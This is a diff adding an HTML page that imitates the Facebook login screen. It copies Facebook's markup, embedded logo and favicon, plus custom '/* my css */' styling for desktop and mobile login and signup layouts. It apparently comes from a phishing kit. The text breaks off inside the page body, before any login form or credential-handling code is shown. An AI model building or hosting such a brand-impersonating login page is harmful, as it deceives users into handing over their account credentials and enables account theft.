@@ -1,0 +1,967 @@
+<!DOCTYPE html>
+
+<html lang="en">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+        <title>Facebook – log in or sign up</title>
+        <meta name="viewport" content="initial-scale=1, width=240" />
+        <meta name="referrer" content="default" id="meta_referrer" />
+        <meta name="theme-color" content="#3b5998" />
+
+        <link rel="shortcut icon" href="data:image/vnd.microsoft.icon;base64,AAABAAIAEBAAAAEAIABoBAAAJgAAACAgAAABACAAqBAAAI4EAAAoAAAAEAAAACAAAAABACAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOFlBiviZgKP4WYB1f//////////4WUA1eJmAI/hawYrAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/4ArBuNpA5TkawP942kC/+NpAv///////////+NpAv/jaQL/5GoD/eNpA5T/gCsGAAAAAAAAAAAAAAAA/4ArBuVvBL3lbgT/5W4E/+VuBP/lbgT////////////lbgT/5W4E/+VuBP/lbgT/5W8Evf+AKwYAAAAAAAAAAOlzBZTncwX/53MF/+dzBf/ncwX/53MF////////////53MF/+dzBf/ncwb/53MF/+dzBv/pcweUAAAAAO19DCvpeAf96HcH/+l4B//odwf/6XgH/+l4B////////////+h3B//odwf/6XgH/+h3B//peAf/6nkH/e19DCvrfQmP630J/+t9Cf/rfAn/630J/+t8Cf/rfAn////////////rfQn/630J/+p8CP/rfQn/6nwI/+p8CP/rfQuP7YEL1e2BCv/tgQr/7IEK/+2BCv/////////////////////////////////uiRj/7IEK/+2CCv/tggr/7YIM1e6GDfPvhgz/74YM/++HDP/vhgz/////////////////////////////////8Zw4/++GDP/uhgz/7oYM/+6GDPPwiw7z8IsN//CLDf/wiw3/8IsN//CLDf/wiw3////////////wig3/8IoN//CLDf/wig3/8IsN//CLDf/xjA/z85EQ1fOQD//zkA//85AP//OQD//zkA//85AP////////////8o8P//KPD//ykA//8o8P//KQD//ykA//85EQ1fSUEI/1lRH/9ZUR//SUEP/1lRH/9JQQ//SUEP/+9uz///////jDev/0mRz/9ZUR//SVEf/1lRH/9ZUR//SUEI/5mhgr95kS/faZEv/2mRL/9pkS//aZEv/2mRL//Nqo//////////////////rLhv/3mhL/9pkS//eZEv35mhgrAAAAAPifFZT4nhT/+Z8U//ieFP/5nxT/+Z8U//ikI//83a3//vjw//78+f/7yX3/+J4T//ieFP/4nxWUAAAAAAAAAAD/qisG+6MWvfqjFf/6oxX/+qMV//qjFf/6oxX/+qMV//qjFf/6oxX/+qIV//qjFf/7oxa9/6orBgAAAAAAAAAAAAAAAP+qKwb9qRiU/agW/fyoF//8qBf//agX//yoF//9qBf//agX//2oF/39qRiU/6orBgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP+yHiv/rRmP/6wZ1f+tGPP/rBjz/64Z1f+vGY//sh4rAAAAAAAAAAAAAAAAAAAAAPAPAADAAwAAgAEAAIABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIABAACAAQAAwAMAAPAPAAAoAAAAIAAAAEAAAAABACAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP+AAAbiZQRH4GMAlf//////////////////////////4GQAv+BjAJXiZQBH/4AABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOpqCxjiZgKW4WYB8eJmAf/hZQH////////////////////////////hZgH/4mYB/+FmAf/iZwHx4mYClupqCxgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP9tJAfkagSC42kC9ONoAv/jaAL/4mgC/+NoAv///////////////////////////+JoAf/iaAL/4mgB/+JoAv/iaAL/42kC9ORqBIL/bSQHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADqagsY5GoEx+NqA//jagP/42oD/+NqA//kawP/42oD////////////////////////////42oD/+RrA//jagP/5GsD/+RrA//kawP/5GsD/+RsBMfqdQsYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6HEGLeVuBOPlbQT/5GwD/+VtBP/kbAP/5GwD/+VtBP/kbAP////////////////////////////kbAP/5G0D/+RsA//kbQP/5G0D/+RtA//kbQP/5G0D/+RuA+PocQYtAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOp1CxjmcAbj5W8E/+VvBP/lbwT/5W8E/+VvBP/lbwT/5W8E/+VvBP///////////////////////////+VvBP/mcAX/5W8E/+ZwBf/mcAX/5W8E/+ZwBf/lbwT/5W8E/+ZwBuPqdQsYAAAAAAAAAAAAAAAAAAAAAAAAAAD/kiQH53IFx+ZyBf/mcQX/5nEF/+ZxBf/mcQX/5nEF/+ZxBf/ncgX/5nEF////////////////////////////53IG/+ZxBf/ncgb/5nEF/+ZxBf/mcgX/5nEF/+ZyBf/mcgX/5nEF/+dyBcf/kiQHAAAAAAAAAAAAAAAAAAAAAOd2CILodAb/53QG/+h0Bv/odAb/6HQG/+h0Bv/odAb/6HQG/+d0Bv/odAb////////////////////////////ndAX/53QG/+d0Bf/ndAb/53QG/+h1Bv/ndAb/6HUG/+h1Bv/ndAX/6HUG/+d2BoIAAAAAAAAAAAAAAADqgAsY6HYG9Oh2B//odgb/6HYH/+h2B//odgb/6HYH/+h2Bv/odgb/6HYH/+h2Bv///////////////////////////+l3B//odgb/6XcH/+h2Bv/odgb/6HYH/+h2Bv/odgf/6HYH/+h2Bv/odgf/6HYG9OqACxgAAAAAAAAAAOt6CZbpeQj/6nkI/+l5CP/qeQj/6nkI/+l5B//qeQj/6XkH/+l5B//peQf/6XkH////////////////////////////6XkI/+l5B//peQj/6XkH/+l5B//peQj/6XkH/+l5CP/peQj/6XkH/+l5CP/peQf/63oJlgAAAAD/gCsG7H0K8et8Cf/qewj/63wJ/+p7CP/qewj/6nsI/+p7CP/qewj/6nsI/+t8Cf/qewj////////////////////////////qewj/6nwJ/+p7CP/qfAn/6nwJ/+p7CP/qfAn/6nsI/+p7CP/rfAn/6nsI/+t8Cf/sfQrx/4ArBu2BC0frfQn/630J/+t+Cf/rfQn/634J/+t+Cf/rfgn/634J///////////////////////////////////////////////////////////////////////zs27/634J/+x+Cf/rfgn/634J/+t+Cf/rfgn/634J/+t+Cf/tgQtH7IAKleyACv/sgAr/7IAK/+yACv/sgAr/7IAK/+yACv/sgAr///////////////////////////////////////////////////////////////////////XCiv/sgAr/7IAK/+yACv/sgAr/7IAJ/+yACv/sgAn/7IAJ/+yACpXugwu/7YML/+2DC//tggr/7YML/+2CCv/tggr/7YIK/+2CCv//////////////////////////////////////////////////////////////////////+NKn/+2DC//tggr/7YML/+2DC//tgwv/7YML/+2DC//tgwv/7oMLv++GDNnuhQv/7oUL/+6FC//uhQv/7oUL/+6FC//vhQz/7oUL///////////////////////////////////////////////////////////////////////64cT/7oUL/+6FC//uhQv/7oUL/+6EC//uhQv/7oQL/+6EC//vhgzZ74gO8++IDP/viAz/74cM/++IDP/vhwz/74cM/++HDP/vhwz///////////////////////////////////////////////////////////////////////3w4f/viA3/74cM/++IDf/viA3/74cM/++IDf/vhwz/74cM/++HDfPwiw7z8IoN//CKDf/wig3/8IoN//CKDf/wig3/8IkN//CKDf/wiQ3/8IkN//CKDf/wiQ3////////////////////////////wiQ3/8IoN//CJDf/wig3/8IoN//CJDf/wig3/8IkN//CJDf/wiQ3/8IkN//CJDf/wiQ3/8IsO8/KNDtnxjA7/8YwO//GMDf/xjA7/8YwN//GMDf/xjA3/8YwN//GMDf/xjA3/8YwO//GMDf////////////////////////////GMDv/xjA7/8YwO//GMDv/xjA7/8YwO//GMDv/xjA7/8YwO//GMDv/xjA7/8YwO//GMDv/yjQ7Z8o8Pv/KPD//yjw//8o8P//KPD//yjw//8o8P//KPD//yjw//8o8P//KPD//yjg7/8o8P////////////////////////////8Y4O//KODv/xjg7/8o4O//KODv/yjg7/8o4O//KODv/yjg7/8o8P//KODv/yjw//8o8P//OQEL/zkQ+V85EP//ORD//zkQ//85EP//ORD//zkQ//85EP//ORD//zkQ//85EP//OREP/zkQ///vr0///////////////////////0myb/85EQ//ORD//zkRD/85EQ//ORD//zkRD/85EP//ORD//zkQ//85EP//ORD//zkQ//85EPlfSXEkf0kxD/9JMQ//SUEP/0kxD/9JQQ//SUEP/zkxD/9JQQ//OTEP/zkxD/9JQQ//OTEP/86tD///////////////////////rVov/1nSb/85MQ//STEP/0kxD/9JMQ//STEP/0kxD/9JMQ//SUEP/0kxD/9JQQ//SUEP/0kxJH/6orBvWWEvH1lhH/9ZYR//WWEf/1lhH/9ZYR//WWEf/1lhH/9ZYR//WWEf/1lhH/9ZYR//vZq//////////////////////////////////////////////////1lhH/9ZYR//WWEf/1lhH/9ZYR//WWEf/1lhH/9ZYS8f+qKwYAAAAA95kTlvaYEv/2mBH/9pgS//aYEf/2mBH/9ZgR//aYEf/1mBH/9ZgR//aYEv/1mBH/+LFN//////////////////////////////////////////////////aYEv/1mBH/9pgS//aYEv/1mBH/9pgS//WYEf/3mRGWAAAAAAAAAAD/nxUY+JwU9PebE//3mxP/95sT//ebE//3mxP/95sT//ebE//3mxP/95oS//ebE//3mhL//OK7////////////////////////////////////////////95sT//ebE//3mxP/95sT//aaEv/3mxP/95sT9P+fFRgAAAAAAAAAAAAAAAD5nxSC+J0T//idE//4nRP/+J0T//ecE//4nRP/95wT//ecE//4nRP/95wT//idE//4pSf//efF///////////////////////////////////////4nRP/950T//idE//4nRP/+J0T//idE//5nxSCAAAAAAAAAAAAAAAAAAAAAP+2JAf6oBXH+aAU//mgFP/5oBT/+J8U//mgFP/4nxT/+J8U//mfFP/4nxT/+Z8U//mfFP/5oRf/+86H//7w2v/+/Pj//v36//758f/+8+P//evQ//mgFP/5nxT/+aAU//mgFP/4nxT/+qAVx/+2JAcAAAAAAAAAAAAAAAAAAAAAAAAAAP+qFRj7oxXj+aEU//mhFP/6ohX/+aEU//qiFf/6ohX/+qIV//qiFf/6ohX/+qIV//mhFP/6ohX/+aEU//mhFP/6ohX/+aEU//qiFf/6ohX/+aEU//qiFf/5oRT/+aEU//ujFeP/qhUYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP+mFi78pBXj+6QV//ukFv/7pBX/+6QW//ukFv/6pBX/+6QW//qkFf/6pBX/+6QW//qkFf/7pBb/+6QW//ulFv/7pBb/+6UW//ulFv/7pBX/+6UW//ukFf/8pBXj/6QXLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP+qIBj8qBfH/KcW//ynF//8pxb//KcW//ynFv/8pxb//KcW//ynFv/7phb//KcW//umFv/7phb/+6YW//umFv/7phb/+6YW//ynFv/7phb//KgXx/+qIBgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP+2JAf9qxiC/akY9PypF//8qRf//KgX//ypF//8qBf//KgX//2pF//8qBf//akX//2pF//9qRf//akX//2pF//9qRf//qkY9P2rGIL/tiQHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/tSAY/60alv+sGPH+rBj//qwY//6sGP/+rBj//asY//6sGP/9qxj//asY//2rF//9qxj//qsX8f2sGJb/tSAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/9UrBv+wGUf/rxqV/68Zv/+vGtn/rhnz/64Z8/+vGtn/rxm//68alf+wGUf/1SsGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/AA///AAD//AAAP/gAAB/wAAAP4AAAB8AAAAPAAAADgAAAAYAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAABgAAAAcAAAAPAAAAD4AAAB/AAAA/4AAAf/AAAP/8AAP//wAP/" type="image/x-icon">
+		<style>
+			/*<![CDATA[*/
+.t {
+	pointer-events: none;
+}
+
+.x {
+	padding: 8px;
+}
+
+.cj {
+	padding-bottom: 12px;
+	padding-top: 12px;
+}
+
+.ci {
+	padding-left: 4px;
+	padding-right: 4px;
+}
+
+.cd {
+	padding-left: 8px;
+	padding-right: 8px;
+}
+
+.b .cf {
+	display: block;
+	width: auto;
+}
+
+.b .cf .cg,
+.b .cf .cg:hover {
+	background-color: #42b72a;
+	color: #fff;
+	height: 44px;
+}
+
+.b .ca {
+	display: block;
+	margin-bottom: 5px;
+	margin-left: 3%;
+	margin-top: -3px;
+	overflow: hidden;
+	text-align: center;
+	white-space: nowrap;
+	width: 94%;
+}
+
+.b .ca>span {
+	display: inline-block;
+	position: relative;
+}
+
+.b .ca>span:before,
+.b .ca>span:after {
+	background: #ccd0d5;
+	content: "";
+	height: 1px;
+	position: absolute;
+	top: 50%;
+	width: 9999px;
+}
+
+.b .ca>span:before {
+	margin-right: 15px;
+	right: 100%;
+}
+
+.b .ca>span:after {
+	left: 100%;
+	margin-left: 15px;
+}
+
+.b .cb {
+	color: #4b4f56;
+	font-size: 14px;
+}
+
+.b .bu {
+	border: solid 1px #999;
+	-webkit-box-sizing: border-box;
+	width: 100%;
+}
+
+.b .u {
+	border: 0;
+	border-collapse: collapse;
+	margin: 0;
+	padding: 0;
+	width: 100%;
+}
+
+.b .u tbody {
+	vertical-align: top;
+}
+
+.b .u td {
+	padding: 0;
+}
+
+.b .u td.bo {
+	padding: 4px;
+}
+
+.b .v {
+	width: 100%;
+}
+
+.w {
+	background: #fa3e3e;
+}
+
+.y {
+	color: #fff;
+}
+
+.b .y a,
+.b .y a:visited {
+	color: #fff;
+	font-weight: bold;
+}
+
+.b .y a:focus,
+.b .y a:hover {
+	background: #1d2129;
+}
+
+.cl {
+	color: #4b4f56;
+}
+
+.z {
+	font-size: 12px;
+	line-height: 16px;
+}
+
+.ck {
+	font-size: 16px;
+	line-height: 20px;
+}
+
+.s {
+	font-weight: normal;
+}
+
+.bq {
+	font-weight: bold;
+}
+
+.cc {
+	text-align: center;
+}
+
+.f {
+	background-color: #fff;
+}
+
+.h {
+	background-color: #3b5998;
+}
+
+.ba {
+	background-color: #eceff5;
+}
+
+.bc {
+	background-color: #fffbe2;
+	color: #7f7212;
+}
+
+.i {
+	padding: 2px 3px;
+}
+
+.bd {
+	padding: 6px 3px;
+}
+
+.be {
+	border-top: 1px solid;
+}
+
+.bf {
+	border-bottom: 1px solid;
+}
+
+.f {
+	border-color: #e9e9e9;
+}
+
+.h {
+	border-color: #1d4088;
+}
+
+.ba {
+	border-color: #d8dfea;
+}
+
+.bc {
+	border-color: #e2c822;
+}
+
+.bg .bh {
+	display: inline-block;
+	margin-right: 4px;
+}
+
+.b .bg .bh {
+	float: left;
+}
+
+.b .bg .bi {
+	display: table-cell;
+}
+
+.k {
+	border: 0;
+	display: inline-block;
+	vertical-align: top;
+}
+
+i.k u {
+	position: absolute;
+	width: 0;
+	height: 0;
+	overflow: hidden;
+}
+
+.b a,
+.b a:visited {
+	color: #3b5998;
+	text-decoration: none;
+}
+
+.b a:focus,
+.b a:hover {
+	background-color: #3b5998;
+	color: #fff;
+}
+
+.bj {
+	clear: both;
+}
+
+form {
+	margin: 0;
+	border: 0;
+}
+
+.bn {
+	margin: 0;
+}
+
+.bn li {
+	display: block;
+	list-style: none;
+}
+
+.b .cm {
+	padding: 0;
+}
+
+.b .bo {
+	padding: 4px;
+}
+
+.b .br {
+	color: #8d949e;
+	display: block;
+	font-weight: bold;
+}
+
+.b .bt {
+	padding: 12px 8px;
+	color: #1c1e21;
+}
+
+.bs {
+	border: 0;
+	display: block;
+	margin: 0;
+	padding: 0;
+}
+
+.bv {
+	-webkit-box-sizing: border-box;
+	width: 100%;
+}
+
+.b .bw {
+	border: solid 1px #999;
+}
+
+.n {
+	-webkit-appearance: none;
+	background: none;
+	display: inline-block;
+	font-size: 12px;
+	height: 28px;
+	line-height: 28px;
+	margin: 0;
+	overflow: visible;
+	padding: 0 9px;
+	text-align: center;
+	vertical-align: top;
+	white-space: nowrap;
+}
+
+.b .n {
+	border-radius: 2px;
+}
+
+.ch,
+a.ch,
+.b a.ch,
+.b a.ch:visited {
+	background-color: #f5f6f7;
+	color: #4b4f56;
+}
+
+.b a.ch:hover,
+.b .ch:hover {
+	background-color: #ebedf0;
+	color: #4b4f56;
+}
+
+.b .ch {
+	border: 1px solid #bec3c9;
+}
+
+.ch[disabled] {
+	color: #bec3c9;
+}
+
+.b .ch[disabled]:hover {
+	background-color: #f5f6f7;
+	color: #bec3c9;
+}
+
+.bz,
+.q,
+a.bz,
+a.q,
+html .b a.bz,
+html .b a.q {
+	color: #fff;
+}
+
+.b .q {
+	background-color: #4080ff;
+	border: 1px solid #4476e8;
+}
+
+.b a.q:hover,
+.b .q:hover {
+	background-color: #4580ef;
+}
+
+.b .bz {
+	background-color: #4267b2;
+	border: 1px solid #365899;
+}
+
+.b a.bz:hover,
+.b .bz:hover {
+	background-color: #465e91;
+}
+
+.bz[disabled] {
+	color: #899bc1;
+}
+
+.q[disabled] {
+	color: #91b4fd;
+}
+
+.b .bz[disabled]:hover {
+	background-color: #4267b2;
+}
+
+.b .q[disabled]:hover {
+	background-color: #4080ff;
+}
+
+.by {
+	font-size: 14px;
+	height: 44px;
+	line-height: 44px;
+	padding: 0 20px;
+}
+
+.n .t {
+	display: inline-block;
+}
+
+.b .n .t {
+	display: inline-block;
+	margin-top: 0;
+	vertical-align: middle;
+}
+
+.b a.n::after {
+	content: "";
+	display: inline-block;
+	height: 100%;
+	vertical-align: middle;
+}
+
+.n .t {
+	line-height: 20px;
+	margin-top: 4px;
+}
+
+.by .t {
+	line-height: 24px;
+	margin-top: 10px;
+}
+
+.n.bx {
+	display: block;
+	width: 100%;
+}
+
+a.n.bx,
+.b label.n.bx {
+	display: block;
+	width: auto;
+}
+
+.b .n {
+	padding: 0 8px;
+}
+
+.b a.n {
+	height: 26px;
+	line-height: 26px;
+}
+
+.b .by {
+	padding: 0 19px;
+}
+
+.b a.by {
+	font-size: 14px;
+	height: 42px;
+	line-height: 42px;
+}
+
+body {
+	text-align: left;
+	direction: ltr;
+}
+
+body,
+tr,
+input,
+textarea,
+button {
+	font-family: sans-serif;
+}
+
+body,
+p,
+figure,
+h1,
+h2,
+h3,
+h4,
+h5,
+h6,
+ul,
+ol,
+li,
+dl,
+dd,
+dt {
+	margin: 0;
+	padding: 0;
+}
+
+h1,
+h2,
+h3,
+h4,
+h5,
+h6 {
+	font-size: 1em;
+	font-weight: bold;
+}
+
+ul,
+ol {
+	list-style: none;
+}
+
+article,
+aside,
+figcaption,
+figure,
+footer,
+header,
+nav,
+section {
+	display: block;
+}
+
+#page {
+	position: relative;
+}
+
+.b .o span {
+	font-size: 14px;
+}
+
+.b a.p,
+.b a.p:hover {
+	background-color: #69a74e;
+	color: #fff;
+}
+
+.j {
+	width: 100%;
+}
+
+.j .l {
+	text-align: right;
+}
+
+.cr {
+	display: block;
+	font-size: x-small;
+	margin: -3px -3px 1px -3px;
+	padding: 3px;
+}
+
+.ct {
+	border: 1px solid #90949c;
+	display: block;
+	font-size: x-large;
+	height: 20px;
+	line-height: 18px;
+	text-align: center;
+	vertical-align: middle;
+	width: 20px;
+}
+
+.b .co input,
+.b .co input:visited,
+.b .co a,
+.b .co a:visited {
+	color: #bec3c9;
+}
+
+.b .co input:focus,
+.b .co input:hover,
+.b .co a:focus,
+.b .co a:hover {
+	background: #dadde1;
+	color: #1d2129;
+}
+
+.cn {
+	background-color: #444950;
+	font-size: x-small;
+	padding: 7px 8px 8px;
+}
+
+.cq {
+	color: #bec3c9;
+	display: block;
+	font-size: x-small;
+	margin: -3px -3px 1px -3px;
+	padding: 3px;
+}
+
+.cv {
+	color: #fff;
+}
+
+body,
+tr,
+input,
+textarea,
+.g {
+	font-size: medium;
+}
+
+/* my css */
+.creat-btn{
+	background: #42b72a !important;
+	color: #fff !important;
+}
+/*]]>*/
+*{
+	margin: 0;
+	padding: 0;
+	outline: 0;
+	text-decoration: none;
+	-webkit-box-sizing: border-box;
+	-moz-box-sizing: border-box;
+	-ms-box-sizing: border-box;
+	box-sizing: border-box;
+}
+body{
+	font-family: arial;
+	font-size: 14px;
+	color: #1c1e21;
+	font-weight: normal;
+	background: #f0f2f5
+}
+.loginsignup{
+	padding: 120px;
+}
+.container{
+	width: 1050px;
+	margin: auto;
+}
+.row{
+	display: flex;
+	flex-wrap: wrap;
+}
+.justify-content-between{
+	justify-content: space-between;
+}
+.content-left{
+	max-width: 500px;
+	margin: auto;
+	padding-bottom: 10%;
+	padding-right: 1%;
+}
+.content-left h1{
+	font-size: 50px;
+	color: #1877f2;
+	margin-bottom: 20px;
+	font-weight: 900;
+}
+.content-left h2{
+    font-size: 28px;
+    line-height: 32px;
+    font-weight: normal;
+    margin-bottom: 40px;
+}
+.content-right{
+	max-width: 450px;
+	margin: auto;
+	text-align: center;
+}
+.content-right form{
+	width: 400px;
+	height: 350px;
+	background: #fff;
+	border-radius: 10px;
+	padding: 15px;
+	-webkit-box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
+	-moz-box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
+	box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
+	margin-bottom: 30px;
+}
+.content-right form input{
+	width: 100%;
+	height: 50px;
+	font-size: 17px;
+	border: 1px solid #ddd;
+	border-radius: 5px;
+	padding: 0 15px;
+	margin-bottom: 15px;
+}
+.content-right form input:focus{
+	border-color: #1877f2;
+    box-shadow: 0 0 0 2px #e7f3ff;
+    caret-color: #1877f2;
+}
+.btn{
+	font-size: 20px !important;
+    background: #1877f2;
+    height: 50px !important;
+    color: #fff;
+    line-height: 50px;
+    border-radius: 5px !important;
+    margin-bottom: 20px !important;
+    text-transform: capitalize;
+    font-weight: 700;
+}
+.btn:hover{
+	cursor: pointer;
+}
+.login a{
+	display: block;
+}
+.create-btn a{
+	display: inline-block;
+    margin-top: 0px;
+    padding: 0 17px;
+    background: #42b72a;
+    transition: .3s;
+    font-weight: bold !important;
+    font-size: 17px !important;
+}
+.create-btn a:hover{
+	background: #36a420;
+}
+.forgot a{
+	font-size: 14px;
+	line-height: 19px;
+	color:#1877f2;
+}
+.forgot a:hover,
+.content-right p a:hover{
+	text-decoration: underline;
+}
+.content-right p a{
+	color: #1c1e21;
+	font-weight: 600;
+}
+/* my css */
+.logo-part{
+    padding: 28px 0 16px;
+}
+.logo-part img{
+    height: 106px;
+    margin: -28px;
+}
+.line{
+	align-items: center;
+	border-bottom: 1px solid #dadde1;
+	display: flex;
+	margin: 17px 16px;
+	text-align: center;
+}
+.loginsignup.pc-verson {
+    height: 100vh;
+    display: flex;
+}
+div#pc-verson {
+    position: absolute;
+	top: 50%;
+	left: 50%;
+	transform: translate(-50%, -50%);
+}
+@media (min-width: 768px){
+	/* pc */
+	#mobile-verson{
+		display: none !important;
+	}
+	#pc-verson{
+		display: block !important;
+	}
+}
+
+
+@media (max-width: 768px){
+	/* mobile */
+	#mobile-verson{
+		display: block !important;
+	}
+	#pc-verson{
+		display: none !important;
+	}
+}
+		</style>
+    </head>
+    <body>
+        <div class="g b c d e f" id="mobile-verson">
+            <div id="viewport">
+                <div class="h i" id="header">
+                    <table cellspacing="0" cellpadding="0" class="j">
+                        <tbody>
+                            <tr>
+                                <td valign="middle">
+                                    <h1 style="display: block; height: 0; overflow: hidden; position: absolute; width: 0; padding: 0;">Facebook</h1>
+                                    <img src="data:image/png;base64,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" width="77" height="15" class="k" alt="facebook" />
+                                </td>
+                                <td valign="middle" class="l">
+                                    <a
+                                        href="https://mbasic.facebook.com/reg/"
+                                        class="m n o p q s"
+                                    >
+                                        <span class="t">إنشاء حساب</span>
+                                    </a>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+                <div id="objects_container">
+                    <div class="f" id="root" role="main">
+                        <table class="u" role="presentation">
+                            <tbody>
+                                <tr>
+                                    <td class="v">
+                                        <div class="w x y" style="display: none;" id="login_error"><div class="z"></div></div>
+                                        <div>
+                                            <div class="ba bb">
+                                                <div id="login_top_banner">
+                                                    <div class="bc bd be bf" id="u_0_2_BB">
+                                                        <div class="bg">
